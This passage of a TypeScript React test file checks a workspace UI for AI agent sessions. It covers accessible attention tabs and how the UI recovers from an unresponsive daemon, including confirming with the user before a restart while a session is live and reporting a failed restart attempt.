      const quiet = findTab("agent quiet");
      expect(quiet.querySelector(".workspace-tab-attention")).toBeNull();
    });

    it("says the reason in the tab's accessible name, not only by colour", async () => {
      vi.mocked(sessionsList).mockResolvedValue([
        attentionSession("session-a", "agent blocked", "permission"),
      ]);
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      const tab = [...container.querySelectorAll<HTMLButtonElement>(".workspace-session-tab")][0];
      if (tab === undefined) throw new Error("attention tab did not render");
      // The tab has no aria-label override, so its accessible name is built
      // from its text content — which must carry the reason, not just a colour.
      expect(tab.getAttribute("aria-label")).toBeNull();
      expect(tab.textContent).toContain("agent blocked");
      expect(tab.textContent).toContain("needs approval");
    });
  });

  describe("daemon unresponsive recovery", () => {
    const UNRESPONSIVE_MESSAGE = "the daemon stopped answering";

    beforeEach(() => {
      vi.mocked(daemonStatus).mockResolvedValue({
        state: "unresponsive",
        pid: 42,
        instanceId: "daemon-test",
        protocolVersion: 1,
        clients: 1,
        capabilities: ["typed_permissions"],
        message: UNRESPONSIVE_MESSAGE,
      });
    });

    it("shows the daemon's unresponsive sentence verbatim in the status strip", async () => {
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      const strip = container.querySelector(".workspace-daemon-status");
      if (strip === null) throw new Error("daemon status strip did not render");
      expect(strip.textContent).toContain(UNRESPONSIVE_MESSAGE);
    });

    it("asks once when a session is live, and a decline keeps the state visible without restarting", async () => {
      vi.mocked(ask).mockResolvedValue(false);
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      // The default roster has one live terminal session, so the destructive
      // restart must not happen on its own.
      expect(daemonRestart).not.toHaveBeenCalled();
      expect(ask).toHaveBeenCalledTimes(1);
      const message = String(vi.mocked(ask).mock.calls[0]?.[0]);
      expect(message).toContain("stop");
      expect(message).toContain("conversations are kept");

      // The state stays visible after the decline instead of disappearing.
      const strip = container.querySelector(".workspace-daemon-status");
      if (strip === null) throw new Error("daemon status strip did not render");
      expect(strip.textContent).toContain(UNRESPONSIVE_MESSAGE);
    });

    it("restarts without asking when no session is live", async () => {
      vi.mocked(sessionsList).mockResolvedValue([]);
      vi.mocked(ask).mockResolvedValue(true);
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      expect(daemonRestart).toHaveBeenCalledTimes(1);
      expect(ask).not.toHaveBeenCalled();
    });

    it("says a restart attempt did not complete when the command rejects", async () => {
      vi.mocked(sessionsList).mockResolvedValue([]);
      vi.mocked(daemonRestart).mockRejectedValue(new Error("daemon identity changed"));
      root = createRoot(container);
      await act(async () => {
        root.render(<Workspace />);
      });
      await act(async () => undefined);

      const strip = container.querySelector(".workspace-daemon-status");
      if (strip === null) throw new Error("daemon status strip did not render");
      // Both facts at once: the daemon's own sentence and the failed attempt.
      expect(strip.textContent).toContain(UNRESPONSIVE_MESSAGE);
      expect(strip.textContent).toContain("a restart was attempted, but it did not complete");
    });
  });
});
